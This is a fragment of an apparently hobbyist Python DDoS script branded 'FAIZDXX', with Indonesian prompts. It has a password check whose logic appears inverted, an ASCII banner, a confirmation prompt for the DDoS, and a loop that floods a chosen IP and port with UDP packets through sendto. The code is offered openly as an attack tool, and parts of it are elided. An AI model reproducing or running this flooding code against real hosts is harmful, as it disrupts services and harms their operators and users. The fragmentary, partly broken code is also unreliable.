...
for i in range(3):
    ...
    if (pwd == pasw):
        ...
        time.sleep(2)
        print("[x] password-nya salah cok \n")
        continue
time.sleep(2)
...
os.system("clear")
print(""" 
\033[32m  ________    _       _____  ________  ______   ____  ____  ____  ____  
\033[32m |_   __  |  / \     |_   _||  __   _||_   _ `.|_  _||_  _||_  _||_  _| 
\033[32m   | |_ \_| / _ \      | |  |_/  / /    | | `. \ \ \  / /    \ \  / /   
\033[32m   |  _|   / ___ \     | |     .'.' _   | |  | |  > `' <      > `' <    
\033[32m  _| |_  _/ /   \ \_  _| |_  _/ /__/ | _| |_.' /_/ /'`\ \_  _/ /'`\ \_  
\033[32m |_____||____| |____||_____||________||______.'|____||____||____||____|

===================== [[WELCOME TO FAIZDXX]] ==========================""")

print("\033[31m━━━ Yakin DDOS? (y/n)")
  ...
  while True:
    try:
      ...
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> Paket Dalam Perjalanan To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")
